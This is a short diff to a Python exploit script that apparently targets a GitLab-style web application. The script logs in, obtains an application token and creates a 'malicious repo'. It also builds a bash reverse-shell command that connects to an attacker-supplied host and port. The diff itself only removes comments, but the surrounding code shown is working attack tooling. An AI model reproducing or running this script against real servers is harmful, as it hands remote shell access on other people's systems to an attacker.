@@ -153,7 +153,7 @@ def register(session, base_url, username, password):
         allow_redirects=True,
     )
     if "Username has already been taken." in resp.text:
-        pass  # User already exists, continue
+        pass 
     elif "user/sign_up" in resp.url:
         console.print(f"[bold red]Registration failed: {resp.status_code}[/bold red]")
         raise ValueError("Registration failed")
@@ -322,8 +322,6 @@ def main():
     command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"
     
     try:
-        # Bypassing the buggy registration function
-        # register(session, args.url, username, password)
         login(session, args.url, username, password)
         token = get_application_token(session, args.url)
         repo_name = create_malicious_repo(session, args.url, token)
